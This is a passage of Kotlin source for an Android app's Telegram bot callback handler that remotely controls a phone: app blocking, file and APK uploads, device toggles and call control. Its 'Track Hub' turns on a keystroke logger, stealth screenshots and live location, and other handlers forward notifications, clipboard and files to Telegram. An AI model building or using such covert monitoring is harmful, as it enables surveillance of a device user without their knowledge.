                        renderAppPickerForBlock(query = "", offset = off, editMessageId = messageId)
                    }
                    "block_pick" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderBlockActionMenu(rest, messageId)
                    }
                    "block_now" -> {
                        AppBlockHelper.setBlocked(rest, true)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Blocked", false)
                        TelegramApiClient.editMessageText(
                            token, chatId, messageId,
                            "🚫 <b>${htmlEsc(rest)}</b> is now blocked.\n\nUse /unblockapp or tap below.",
                            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("✅ Unblock now" to "unblock:${rest.take(55)}")))
                        )
                    }
                    "block_lim" -> {
                        val parts = rest.split(":")
                        if (parts.size < 2) return@launch
                        val pkg = parts[0]
                        val mins = parts[1].toIntOrNull() ?: 0
                        AppBlockHelper.setTimeLimit(pkg, mins * 60_000L)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Limit set to ${mins} min/day")
                        TelegramApiClient.editMessageText(
                            token, chatId, messageId,
                            "⏱ <b>${htmlEsc(pkg)}</b> limited to <b>${mins} min/day</b>.\nIt will be blocked once today's usage exceeds the limit.",
                            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("✕ Clear limit" to "limit_clr:${pkg.take(50)}")))
                        )
                    }
                    "limit_clr" -> {
                        AppBlockHelper.setTimeLimit(rest, 0L)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Limit cleared")
                        renderUnblockPicker(editMessageId = messageId)
                    }
                    "unblock" -> {
                        AppBlockHelper.setBlocked(rest, false)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Unblocked")
                        renderUnblockPicker(editMessageId = messageId)
                    }
                    "notif_mute" -> {
                        forwardNotifications = false
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Notifications muted", false)
                        TelegramApiClient.editMessageText(
                            token, chatId, messageId,
                            "🔕 <b>Notification forwarding muted.</b>\nSend <code>/mutenotifs off</code> to resume.",
                            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("🔔 Resume forwards" to "notif_unmute")))
                        )
                    }
                    "notif_unmute" -> {
                        forwardNotifications = true
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Notifications resumed", false)
                        TelegramApiClient.editMessageText(
                            token, chatId, messageId,
                            "🔔 <b>Notification forwarding resumed.</b>\nNew device notifications will appear here again.",
                            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("🔕 Mute again" to "notif_mute")))
                        )
                    }
                    // ---- /apps modern picker ----
                    "apps_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val off = rest.toIntOrNull() ?: 0
                        renderAppsPickerPage(lastAppsQuery, off, editMessageId = messageId)
                    }
                    "apps_q" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send the search text…")
                        pendingInput = "appsearch"
                        sendMessage("🔍 Send a name fragment to search apps (e.g. <code>chrome</code>), or send <code>*</code> to clear.")
                    }
                    "appd" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.editMessageText(token, chatId, messageId, "⚠️ App session expired. Send /apps to start over.")
                        } else {
                            renderAppDetail(pkg, editMessageId = messageId)
                        }
                    }
                    "appl" -> {
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Session expired", true)
                        } else {
                            try {
                                PackageHelper.launch(MainApp.instance, pkg)
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Launching ${pkg}", false)
                            } catch (e: Exception) {
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Launch failed: ${e.message}", true)
                            }
                        }
                    }
                    "appst" -> {
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Session expired", true)
                        } else {
                            try {
                                PackageHelper.viewInSettings(MainApp.instance, pkg)
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Opened settings", false)
                            } catch (e: Exception) {
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message}", true)
                            }
                        }
                    }
                    "appblock" -> {
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Session expired", true)
                        } else {
                            AppBlockHelper.setBlocked(pkg, true)
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Blocked", false)
                            renderAppDetail(pkg, editMessageId = messageId)
                        }
                    }
                    "appunblock" -> {
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Session expired", true)
                        } else {
                            AppBlockHelper.setBlocked(pkg, false)
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Unblocked", false)
                            renderAppDetail(pkg, editMessageId = messageId)
                        }
                    }
                    "applimit" -> {
                        val parts = rest.split(":")
                        val pkg = parts.getOrNull(0)?.let { pkgFromToken(it) }
                        val mins = parts.getOrNull(1)?.toIntOrNull() ?: 0
                        if (pkg == null || mins <= 0) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Bad limit", true)
                        } else {
                            AppBlockHelper.setTimeLimit(pkg, mins * 60_000L)
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Limited to ${mins} min/day", false)
                            renderAppDetail(pkg, editMessageId = messageId)
                        }
                    }
                    "appclim" -> {
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Session expired", true)
                        } else {
                            AppBlockHelper.setTimeLimit(pkg, 0L)
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Limit cleared", false)
                            renderAppDetail(pkg, editMessageId = messageId)
                        }
                    }
                    "appapk" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Uploading APK…")
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            sendMessage("⚠️ App session expired. Send /apps to start over.")
                        } else {
                            try {
                                val info = PackageHelper.searchAsync(
                                    "ids:$pkg", 1, 0,
                                    com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC,
                                ).firstOrNull()
                                if (info == null) sendMessage("❌ App not found.")
                                else if (info.path.isBlank()) sendMessage("❌ APK file path unavailable for <code>${htmlEsc(pkg)}</code>.")
                                else cbSendFile(info.path)
                            } catch (e: Exception) {
                                sendMessage("❌ Failed: ${htmlEsc(e.message ?: "")}")
                            }
                        }
                    }
                    "appicn" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending icon…")
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            sendMessage("⚠️ App session expired. Send /apps to start over.")
                        } else {
                            sendAppIcon(pkg)
                        }
                    }
                    "appcp" -> {
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Session expired", true)
                        } else {
                            try {
                                val cm = MainApp.instance.getSystemService(android.content.Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
                                cm.setPrimaryClip(android.content.ClipData.newPlainText("package", pkg))
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Copied to device clipboard", false)
                            } catch (e: Exception) {
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message}", true)
                            }
                        }
                    }
                    "appu" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.editMessageText(token, chatId, messageId, "⚠️ App session expired. Send /apps to start over.")
                        } else {
                            TelegramApiClient.editMessageText(
                                token, chatId, messageId,
                                "🗑 <b>Uninstall ${htmlEsc(pkg)}?</b>\n\nThe Android system uninstall dialog will pop up on the device — you must confirm there too.",
                                replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
                                    listOf("✅ Yes, prompt on device" to "appuok:$rest"),
                                    listOf("◀️ Cancel" to "appd:$rest"),
                                ))
                            )
                        }
                    }
                    "appuok" -> {
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Session expired", true)
                        } else {
                            try {
                                PackageHelper.uninstall(MainApp.instance, pkg)
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Confirm on device")
                                TelegramApiClient.editMessageText(
                                    token, chatId, messageId,
                                    "🗑 Uninstall dialog opened on the device for <code>${htmlEsc(pkg)}</code>.\nConfirm there to complete removal.",
                                    replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("◀️ Back to apps" to "apps_pg:0")))
                                )
                            } catch (e: Exception) {
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message}", true)
                            }
                        }
                    }
                    "files_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val tok = rest.substring(0, sep)
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        val path = pathFromToken(tok)
                        if (path == null) {
                            TelegramApiClient.editMessageText(token, chatId, messageId, "⚠️ Path session expired. Send /files to start over.")
                        } else {
                            renderFolderPage(path, off, editMessageId = messageId)
                        }
                    }
                    "file_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val path = pathFromToken(rest)
                        if (path == null) {
                            TelegramApiClient.editMessageText(token, chatId, messageId, "⚠️ Path session expired. Send /files to start over.")
                        } else {
                            renderFileView(path, editMessageId = messageId)
                        }
                    }
                    "file_get" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Uploading file…")
                        val path = pathFromToken(rest)
                        if (path == null) {
                            sendMessage("⚠️ Path session expired. Send /files to start over.")
                        } else {
                            cbSendFile(path)
                        }
                    }
                    // ---- Notes ----
                    "notes_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderNotesPage(q, off, editMessageId = messageId)
                    }
                    "note_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading note…")
                        renderNoteDetail(rest, editMessageId = messageId)
                    }
                    "note_back" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderNotesPage(lastNotesQuery, lastNotesOffset, editMessageId = messageId)
                    }
                    "note_del" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        TelegramApiClient.editMessageReplyMarkup(
                            token, chatId, messageId,
                            TelegramApiClient.inlineKeyboard(listOf(
                                listOf("✅ Yes, trash it" to "note_del_ok:$rest", "✕ Cancel" to "note_view:$rest"),
                                listOf("⬅️ Back to list" to "note_back"),
                            ))
                        )
                    }
                    "note_del_ok" -> {
                        try {
                            NoteHelper.trashAsync(setOf(rest))
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🗑 Note trashed")
                        } catch (e: Exception) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message?.take(60)}", true)
                        }
                        renderNotesPage(lastNotesQuery, lastNotesOffset, editMessageId = messageId)
                    }
                    // ---- Bookmarks ----
                    "bm_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderBookmarksPage(q, off, editMessageId = messageId)
                    }
                    "bm_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderBookmarkDetail(rest, editMessageId = messageId)
                    }
                    "bm_back" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderBookmarksPage(lastBookmarksQuery, lastBookmarksOffset, editMessageId = messageId)
                    }
                    "bm_del" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        TelegramApiClient.editMessageReplyMarkup(
                            token, chatId, messageId,
                            TelegramApiClient.inlineKeyboard(listOf(
                                listOf("✅ Yes, delete" to "bm_del_ok:$rest", "✕ Cancel" to "bm_view:$rest"),
                            ))
                        )
                    }
                    "bm_del_ok" -> {
                        try {
                            BookmarkHelper.deleteBookmarks(setOf(rest), MainApp.instance)
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🗑 Bookmark deleted")
                        } catch (e: Exception) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message?.take(60)}", true)
                        }
                        renderBookmarksPage(lastBookmarksQuery, lastBookmarksOffset, editMessageId = messageId)
                    }
                    "bm_open" -> {
                        try {
                            val bm = BookmarkHelper.getById(rest)
                            if (bm == null) { TelegramApiClient.answerCallbackQuery(token, cqId, "Not found", true); return@launch }
                            BookmarkHelper.recordClick(rest)
                            val intent = android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(bm.url))
                            intent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                            MainApp.instance.startActivity(intent)
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🌐 Opened on device")
                        } catch (e: Exception) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message?.take(60)}", true)
                        }
                    }
                    // ---- Feeds ----
                    "feed_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading entries…")
                        renderFeedEntriesPage(rest, 0, editMessageId = messageId)
                    }
                    "feeds_back" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderFeedsList(editMessageId = messageId)
                    }
                    "fe_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val feedId = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderFeedEntriesPage(feedId, off, editMessageId = messageId)
                    }
                    "fe_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading entry…")
                        renderFeedEntryDetail(rest, editMessageId = messageId)
                    }
                    "fe_back" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        val feedId = if (sep < 0) rest else rest.substring(0, sep)
                        val off = if (sep < 0) 0 else rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderFeedEntriesPage(if (feedId == "_") "" else feedId, off, editMessageId = messageId)
                    }
                    // ---- Music / videos / images ----
                    "mus_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderMusicPage(q, off, editMessageId = messageId)
                    }
                    "mus_get" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending audio…")
                        val path = pathFromToken(rest)
                        if (path == null) sendMessage("⚠️ Track session expired. Send /music again.")
                        else cbSendMediaAudio(path)
                    }
                    "vds_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderVideosPage(q, off, editMessageId = messageId)
                    }
                    "vds_get" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending video…")
                        val path = pathFromToken(rest)
                        if (path == null) sendMessage("⚠️ Video session expired. Send /videos again.")
                        else cbSendMediaVideo(path)
                    }
                    "img_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderImagesPage(q, off, editMessageId = messageId)
                    }
                    "img_get" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending photo…")
                        val path = pathFromToken(rest)
                        if (path == null) sendMessage("⚠️ Image session expired. Send /images again.")
                        else cbSendMediaImage(path)
                    }
                    // ---- Pomodoro ----
                    "pom_start" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "▶️ Starting…")
                        val secs = try {
                            PomodoroSettingsPreference.getValueAsync(MainApp.instance).workDuration * 60
                        } catch (_: Throwable) { 25 * 60 }
                        sendEvent(HttpApiEvents.PomodoroStartEvent(secs))
                        renderPomodoroStatus(editMessageId = messageId)
                    }
                    "pom_pause" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "⏸ Paused")
                        sendEvent(HttpApiEvents.PomodoroPauseEvent())
                        renderPomodoroStatus(editMessageId = messageId)
                    }
                    "pom_stop" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "⏹ Stopped")
                        sendEvent(HttpApiEvents.PomodoroStopEvent())
                        renderPomodoroStatus(editMessageId = messageId)
                    }
                    "pom_refresh" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderPomodoroStatus(editMessageId = messageId)
                    }
                    // ---- Torch / find phone / quick toggles ----
                    "torch_on" -> {
                        try { UtilitiesHelper.setTorch(true); TelegramApiClient.answerCallbackQuery(token, cqId, "🔦 ON") }
                        catch (e: Exception) { TelegramApiClient.answerCallbackQuery(token, cqId, "Failed", true) }
                        renderTorchState(editMessageId = messageId)
                    }
                    "torch_off" -> {
                        try { UtilitiesHelper.setTorch(false); TelegramApiClient.answerCallbackQuery(token, cqId, "🔦 OFF") }
                        catch (_: Exception) { TelegramApiClient.answerCallbackQuery(token, cqId, "Failed", true) }
                        renderTorchState(editMessageId = messageId)
                    }
                    "fp_on" -> {
                        LocateRingService.start()
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🚨 Alarm started")
                        renderFindPhoneState(editMessageId = messageId)
                    }
                    "fp_off" -> {
                        LocateRingService.stop()
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔕 Alarm stopped")
                        renderFindPhoneState(editMessageId = messageId)
                    }
                    "wifi_on" -> {
                        WifiControlHelper.setWifiEnabled(true, MainApp.instance)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "📶 Enabling…")
                        kotlinx.coroutines.delay(800)
                        renderWifiState(editMessageId = messageId)
                    }
                    "wifi_off" -> {
                        WifiControlHelper.setWifiEnabled(false, MainApp.instance)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "📶 Disabling…")
                        kotlinx.coroutines.delay(800)
                        renderWifiState(editMessageId = messageId)
                    }
                    "vol_set" -> {
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val stream = rest.substring(0, sep)
                        val pct = rest.substring(sep + 1).toIntOrNull() ?: 50
                        UtilitiesHelper.setVolume(stream, pct)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔊 $stream → $pct%")
                        renderVolumeState(editMessageId = messageId)
                    }
                    "br_set" -> {
                        val pct = rest.toIntOrNull() ?: 50
                        val ok = UtilitiesHelper.setBrightness(pct)
                        if (ok) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🔆 $pct%")
                            renderBrightnessState(editMessageId = messageId)
                        } else {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Need WRITE_SETTINGS perm", true)
                        }
                    }
                    // ---- Track Hub ----
                    "trk_loc_on" -> {
                        LocationTrackingHelper.setEnabled(true)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🟢 Live Location ON")
                        renderTrackHub(editMessageId = messageId)
                    }
                    "trk_loc_off" -> {
                        LocationTrackingHelper.setEnabled(false)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "⚪ Live Location OFF")
                        renderTrackHub(editMessageId = messageId)
                    }
                    "trk_key_on" -> {
                        KeystrokeLogHelper.setEnabled(true)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🟢 Keystroke Logger ON")
                        renderTrackHub(editMessageId = messageId)
                    }
                    "trk_key_off" -> {
                        KeystrokeLogHelper.setEnabled(false)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "⚪ Keystroke Logger OFF")
                        renderTrackHub(editMessageId = messageId)
                    }
                    "trk_shot_on" -> {
                        StealthScreenshotHelper.setEnabled(true)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🟢 Stealth Shots ON")
                        renderTrackHub(editMessageId = messageId)
                    }
                    "trk_shot_off" -> {
                        StealthScreenshotHelper.setEnabled(false)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "⚪ Stealth Shots OFF")
                        renderTrackHub(editMessageId = messageId)
                    }
                    "trk_refresh" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔄 Refreshed")
                        renderTrackHub(editMessageId = messageId)
                    }
                    // ---- Backup ----
                    "bk_zip" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "📦 Sending as .zip…")
                        val ctx = com.ismartcoding.plain.MainApp.instance
                        val existing = File(ctx.cacheDir, "plainapp_backup_tg.${BackupManager.FILE_EXTENSION}")
                        if (!existing.exists()) {
                            sendMessage("⚠️ Backup session expired. Run /backup again to create a fresh one.")
                            return@launch
                        }
                        val zipName = existing.name.removeSuffix(".${BackupManager.FILE_EXTENSION}") + ".zip"
                        val TELEGRAM_LIMIT = 50L * 1024 * 1024
                        if (existing.length() <= TELEGRAM_LIMIT) {
                            val ok = TelegramApiClient.sendDocument(token, chatId, existing, displayName = zipName)
                            if (!ok) sendMessage("❌ Failed to send .zip file. Try /backup again.")
                        } else {
                            val dlToken = java.util.UUID.randomUUID().toString().replace("-", "").take(24)
                            BackupDownloadManager.register(dlToken, existing, existing.name)
                            val cfEnabled = com.ismartcoding.plain.preferences.CloudflareTunnelEnabledPreference.getAsync(ctx)
                            val cfHostname = com.ismartcoding.plain.preferences.CloudflareTunnelHostnamePreference.getAsync(ctx)
                            val baseUrl = if (cfEnabled && cfHostname.isNotBlank()) "https://$cfHostname"
                                          else "http://${com.ismartcoding.lib.helpers.NetworkHelper.getDeviceIP4()}:${com.ismartcoding.plain.TempData.httpPort}"
                            sendMessage("📦 File too large for Telegram (${existing.length() / 1_048_576} MB).\n\n🔗 <b>Download as .zip (30 min):</b>\n<code>$baseUrl/backup/dl?t=$dlToken&amp;zip=1</code>")
                        }
                    }
                    "bk_rebuild" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔄 Rebuilding backup…")
                        cmdBackup()
                    }
                    // ---- Bedtime ----
                    "bt_on" -> {
                        val cur = com.ismartcoding.plain.services.AppBlockHelper.getBedtime()
                        com.ismartcoding.plain.services.AppBlockHelper.setBedtime(
                            com.ismartcoding.plain.services.AppBlockHelper.Bedtime(true, cur.startMinutes, cur.endMinutes, cur.packages)
                        )
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🌙 Bedtime ON")
                        renderBedtimeState(editMessageId = messageId)
                    }
                    "bt_off" -> {
                        val cur = com.ismartcoding.plain.services.AppBlockHelper.getBedtime()
                        com.ismartcoding.plain.services.AppBlockHelper.setBedtime(
                            com.ismartcoding.plain.services.AppBlockHelper.Bedtime(false, cur.startMinutes, cur.endMinutes, cur.packages)
                        )
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🌙 Bedtime OFF")
                        renderBedtimeState(editMessageId = messageId)
                    }
                    "bt_w" -> {
                        // bt_w:<startMin>:<endMin>
                        val sep = rest.indexOf(':')
                        if (sep < 0) { TelegramApiClient.answerCallbackQuery(token, cqId, "Bad value", true); return@launch }
                        val sm = rest.substring(0, sep).toIntOrNull()
                        val em = rest.substring(sep + 1).toIntOrNull()
                        if (sm == null || em == null) { TelegramApiClient.answerCallbackQuery(token, cqId, "Bad value", true); return@launch }
                        val cur = com.ismartcoding.plain.services.AppBlockHelper.getBedtime()
                        com.ismartcoding.plain.services.AppBlockHelper.setBedtime(
                            com.ismartcoding.plain.services.AppBlockHelper.Bedtime(true, sm, em, cur.packages)
                        )
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🌙 ${fmtHm(sm)}–${fmtHm(em)}")
                        renderBedtimeState(editMessageId = messageId)
                    }
                    "bt_custom" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        pendingInput = "bedtime_set"
                        sendMessage("🌙 <b>Set bedtime window</b>\n\nReply with start and end in 24-hour format, e.g. <code>22:00 06:30</code>.\nSend <code>off</code> to disable.")
                    }
                    // ---- Launch history ----
                    "launches_clear" -> {
                        com.ismartcoding.plain.services.AppBlockHelper.clearHistory()
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🗑 Cleared")
                        TelegramApiClient.editMessageText(token, chatId, messageId, "🗑 Launch history cleared.")
                    }
                    "launches_refresh" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        cmdLaunches(emptyList())
                    }
                    // ---- Live call ----
                    "lc_accept" -> {
                        com.ismartcoding.plain.services.LiveCallTracker.acceptFromPanel()
                        TelegramApiClient.answerCallbackQuery(token, cqId, "✅ Accepted")
                        renderLiveCallState(editMessageId = messageId)
                    }
                    "lc_end" -> {
                        com.ismartcoding.plain.services.LiveCallTracker.end()
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔚 Ended")
                        renderLiveCallState(editMessageId = messageId)
                    }
                    "lc_mute" -> {
                        com.ismartcoding.plain.services.LiveCallTracker.setMuted(true)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔇 Muted")
                        renderLiveCallState(editMessageId = messageId)
                    }
                    "lc_unmute" -> {
                        com.ismartcoding.plain.services.LiveCallTracker.setMuted(false)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🎙 Live")
                        renderLiveCallState(editMessageId = messageId)
                    }
                    "lc_refresh" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderLiveCallState(editMessageId = messageId)
                    }
                    // ---- Launcher ----
                    "lpg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderLaunchAppsPage(q, off, editMessageId = messageId)
                    }
                    "lrun" -> {
                        val pkg = pkgFromToken(rest) ?: rest
                        val ok = AppLauncherHelper.launch(pkg)
                        if (ok) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🚀 Launched")
                            sendMessage("🚀 Launched <code>${htmlEsc(pkg)}</code> on the device.")
                        } else {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "No launch intent", true)
                        }
                    }
                    // ---- Airplane mode ----
                    "air_on" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Enabling airplane mode…")
                        cmdAirplane(listOf("on"))
                    }
                    "air_off" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Disabling airplane mode…")
                        cmdAirplane(listOf("off"))
                    }
                    // ---- Mobile data ----
                    "mdata_on" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Enabling mobile data…")
                        cmdMobileData(listOf("on"))
                    }
                    "mdata_off" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Disabling mobile data…")
                        cmdMobileData(listOf("off"))
                    }
                    // ---- Photo forwarding ----
                    "photofwd_on" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        cmdForwardPhotos(listOf("on"))
                    }
                    "photofwd_off" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        cmdForwardPhotos(listOf("off"))
                    }
                    // ---- File auto-forward ----
                    "filefwd_on" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Starting file auto-forward…")
                        cmdForwardFiles(listOf("on"))
                    }
                    "filefwd_off" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Stopping file auto-forward…")
                        cmdForwardFiles(listOf("off"))
                    }
                    "filefwd_retry" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Retrying failed uploads…")
                        cmdRetryFailed()
                    }
                    // ---- Clipboard forwarding ----
                    "clipfwd_on" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        cmdForwardClipboard(listOf("on"))
                    }
                    "clipfwd_off" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        cmdForwardClipboard(listOf("off"))
                    }
                    // ---- Bluetooth ----
                    "blue_on" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Enabling…")
                        BluetoothControlHelper.setEnabled(true)
                        kotlinx.coroutines.delay(1000)
                        renderBluetoothState(editMessageId = messageId)
                    }
                    "blue_off" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Disabling…")
                        BluetoothControlHelper.setEnabled(false)
                        kotlinx.coroutines.delay(1000)
                        renderBluetoothState(editMessageId = messageId)
                    }
                    "blue_refresh" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderBluetoothState(editMessageId = messageId)
                    }
                    // ---- Clear cache picker ----
                    "cc_pick" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Clearing…")
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            sendMessage("⚠️ Session expired. Send /clearcache again.")
                        } else {
                            val ok = clearAppCache(pkg)
                            val label = try { MainApp.instance.packageManager.getApplicationLabel(MainApp.instance.packageManager.getApplicationInfo(pkg, 0)).toString() } catch (_: Throwable) { pkg }
                            if (ok) sendMessage("✅ Cache cleared for <b>${htmlEsc(label)}</b>.")
                            else sendMessage("❌ Could not clear cache for <b>${htmlEsc(label)}</b>.\n<i>Device Admin may be required on some ROMs.</i>")
                        }
                    }
                    "cc_q" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send app name…")
                        pendingInput = "cc_search"
                        sendMessage("🔍 Send an app name to search (e.g. <code>chrome</code>), or <code>*</code> to list all.")
                    }
